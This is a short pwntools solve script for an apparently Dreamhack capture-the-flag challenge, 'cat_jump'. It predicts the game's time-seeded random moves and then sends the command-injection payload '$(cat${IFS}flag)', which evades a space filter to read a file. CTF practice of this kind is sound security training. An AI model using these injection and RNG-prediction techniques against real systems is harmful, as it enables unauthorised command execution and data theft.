#!/usr/bin/python3
from pwn import *
import ctypes, time
exe = ELF("./cat_jump")
libc = ctypes.CDLL("./libc.so.6")
context.binary = exe
s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
if args.REMOTE:
    p = remote('host3.dreamhack.games', 13654)
else:
    p = process([exe.path])
seed = int(time.time())
libc.srand(seed)
cnt = 0
v3 = 0
while(cnt <= 36):
    random1 = libc.rand() % 2
    if(random1 == 0):
        sla(b"left jump='h', right jump='j': ", b'l')
    else:
        sla(b"left jump='h', right jump='j': ", b'h')
    cnt += 1
sla(b': ', b'$(cat${IFS}flag)')
p.interactive()

